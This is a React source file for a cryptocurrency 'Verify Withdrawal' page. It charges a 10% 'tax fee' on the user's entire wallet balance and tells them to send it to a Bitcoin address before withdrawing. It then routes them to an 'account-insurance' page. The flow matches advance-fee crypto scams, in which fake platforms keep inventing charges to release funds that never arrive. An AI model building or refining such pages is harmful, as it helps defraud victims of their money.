// frontend/src/pages/VerifyWithdrawal.js
import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import api from '../utils/axiosInstance';
import './VerifyWithdrawal.css';

export default function VerifyWithdrawal() {
  const { state } = useLocation(); // { amount, crypto, address }
  const [pin, setPin] = useState('');
  const [tax, setTax] = useState(0);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    // Recalculate 10% fee based on current wallet balance
    api.get('/auth/me')
      .then(res => {
        const fee = res.data.walletBalance * 0.1;
        setTax(fee.toFixed(2));
      })
      .catch(() => setTax(0));
  }, []);

  const handleVerify = async e => {
    e.preventDefault();
    try {
      await api.post('/wallet/withdraw', {
        amount: state.amount,
        crypto: state.crypto,
        address: state.address,
        pin
      });
      navigate('/account-insurance', { state });
    } catch (err) {
      setError(err.response?.data?.message || 'Invalid PIN. Please try again.');
    }
  };

  return (
    <div className="form-container">
      <h2>Verify Withdrawal</h2>

      <p><strong>Amount:</strong> ${state.amount}</p>
      <p><strong>Crypto:</strong> {state.crypto}</p>
      <p><strong>Wallet Address:</strong> {state.address}</p>

      <p><strong>Tax Fee (10%):</strong> ${tax}</p>
      <p>Please send your fee payment to the following Bitcoin address:</p>
      <code>535afgvshadsb534sfb</code>

      {error && <p className="error">{error}</p>}

      <form onSubmit={handleVerify}>
        <label>Enter your 5-digit PIN</label>
        <input
          type="text"
          value={pin}
          onChange={e => setPin(e.target.value)}
          maxLength="5"
          required
        />
        <button type="submit">Verify & Continue</button>
      </form>
    </div>
  );
}
